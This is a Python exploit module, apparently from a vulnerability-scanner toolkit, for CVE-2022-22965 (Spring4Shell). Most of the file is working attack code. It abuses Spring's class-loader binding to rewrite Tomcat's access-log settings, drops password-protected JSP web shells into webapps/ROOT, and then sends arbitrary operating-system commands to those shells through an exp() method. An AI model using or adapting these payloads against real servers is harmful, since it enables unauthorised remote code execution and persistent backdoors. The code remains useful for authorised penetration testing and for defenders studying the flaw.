# coding:utf-8
from fileinput import filename
from time import sleep
import requests
import urllib3

from util import RandomUA
from util import JsonMethod
from util.Translate import tr
class CVE_2022_22965:
    def __init__(self):
        ua = RandomUA.RandomUA()

        self.configRead = JsonMethod.JsonMethod()

        self.ua = ua.UserAgent()
        self.Headers_1 = {
            "User-Agent": self.ua,
            "suffix": "%>//",
            "c1": "Runtime",
            "c2": "<%",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        self.payload_linux = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
        self.payload_win = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
        self.payload_http = """?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
        self.data1 = self.payload_linux
        self.data2 = self.payload_win

        self.post_headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        self.get_headers = {
            "prefix": "<%",
            "suffix": "%>//",
            "c": "Runtime",
        }

        self.log_pattern1 = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
                      f"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter" \
                      f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
                      f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"
        self.log_pattern2 = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
                         f"if(%2213exp%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in" \
                         f"%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()" \
                         f"%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20" \
                         f"while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di"
        self.directory = "webapps/ROOT"
        self.log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
        self.log_file_dir = f"class.module.classLoader.resources.context.parent.pipeline.first.directory={self.directory}"
        self.log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    def poc(self,url,proxies,ProxyStute):
        self.expTypeGet = self.configRead.VulnsConfigRead()
        self.expType = self.expTypeGet["expType"]
        if self.expType == "aabysszg":
            result = self.poc1(url,proxies,ProxyStute)
            return result
        else:
            result = self.poc2(url,proxies,ProxyStute)
            return result
    def poc1(self,url,proxies,ProxyStute):
        if ProxyStute == 1:
            proxies = proxies
        else:
            proxies = None
        self.getpayload = url + self.payload_http
        try:
            requests.packages.urllib3.disable_warnings()
            requests.post(url, headers=self.Headers_1, data=self.data1, timeout=6, allow_redirects=False, verify=False,
                          proxies=proxies)
            sleep(0.5)
            requests.post(url, headers=self.Headers_1, data=self.data2, timeout=6, allow_redirects=False, verify=False,
                          proxies=proxies)
            sleep(0.5)
            requests.get(self.getpayload, headers=self.Headers_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
            sleep(0.5)

            test = requests.get(url + "tomcatwar.jsp", verify=False, proxies=proxies)
            if (test.status_code == 200) and ('aabysszg' in str(test.text)):
                result = tr("v.22965.shell_aabyss", url=url)
                return result
            else:
                result = tr("v.22965.shell_manual", url=url)
                return result
        except Exception as e:
            error = tr("v.unknown", url=url, e=e)
            return error
    def poc2(self,url,proxies,ProxyStute):

        if ProxyStute == 1:
            proxies = proxies
        else:
            proxies = None
        if self.expType == "default":
            self.filename = "shell"
            self.log_file_prefix = f"class.module.classLoader.resources.context.parent.pipeline.first.prefix={self.filename}"
            self.exp_data = "&".join([self.log_pattern1, self.log_file_suffix, self.log_file_dir, self.log_file_prefix,
                                      self.log_file_date_format])
        elif self.expType == "13EXP":
            self.filename = "wbexp"
            self.log_file_prefix = f"class.module.classLoader.resources.context.parent.pipeline.first.prefix={self.filename}"
            self.exp_data = "&".join([self.log_pattern2, self.log_file_suffix, self.log_file_dir, self.log_file_prefix,
                                      self.log_file_date_format])
        else:
            return "error"

        try:
            requests.packages.urllib3.disable_warnings()
            file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
            ret = requests.post(url, headers=self.post_headers, data=file_date_data, verify=False, proxies=proxies)
            ret = requests.post(url, headers=self.post_headers, data=self.exp_data, verify=False, proxies=proxies)
            result1 = f"[+]Upload Exp: {ret.status_code}\n"
            if ret.status_code == 200:
                sleep(3)
                ret = requests.get(url, headers=self.get_headers, verify=False, proxies=proxies)
                sleep(1)
                pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
                ret = requests.post(url, headers=self.post_headers, data=pattern_data, verify=False, proxies=proxies)
                result2 = f"[+]Wirte Shell Response Code: {ret.status_code}\n"
                if ret.status_code == 200:
                    if self.expType == "default":
                        result3 = tr("v.22965.shell_default", url=url)
                        return result1 + result2 + result3
                    elif self.expType == "13EXP":
                        result4 = tr("v.22965.shell_13exp", url=url)
                        return result1 + result2 + result4
                    else:
                        return "error"
                else:
                    result = f"[-]Wirte Shell Response Error: {ret.status_code}"
                    return result
            else:
                result = tr("v.22965.shell_scan", url=url)
                return result
        except Exception as e:
            error = tr("v.unknown", url=url, e=e)
            return error
    def exp(self, url, proxies, ProxyStute,cmd):
        self.expTypeGet = self.configRead.VulnsConfigRead()
        self.expType = self.expTypeGet["expType"]
        shell1 = url + f"shell.jsp?cmd={cmd}"
        shell2 = url + f"tomcatwar.jsp?pwd=aabysszg&cmd={cmd}"
        shell3 = url + f"wbexp.jsp?pwd=13exp&cmd={cmd}"
        if ProxyStute == 1:
            proxies = proxies
        else:
            proxies = None
        try:
            if self.expType == "default":
                r = requests.get(url=shell1,proxies=proxies)
            elif self.expType == "aabysszg":
                r = requests.get(url=shell2,proxies=proxies)
            elif self.expType == "13EXP":
                r = requests.get(url=shell3,proxies=proxies)
            else:
                return "error exp"
            resp = r.text.strip("\n")
            return resp
        except urllib3.util.ssl_match_hostname.CertificateError:
            result = tr("v.22965.cmd_req_err")
        except urllib3.exceptions.MaxRetryError:
            result = tr("v.22965.cmd_req_err")
        except requests.exceptions.SSLError:
            result = tr("v.22965.cmd_req_err")
        except:
            result = tr("v.22965.cmd_unknown")
        return  result
if __name__ == "__main__":
    poc = CVE_2022_22965()
    result = poc.poc("http://127.0.0.1:8081",proxies=None,ProxyStute=0)
    print(result)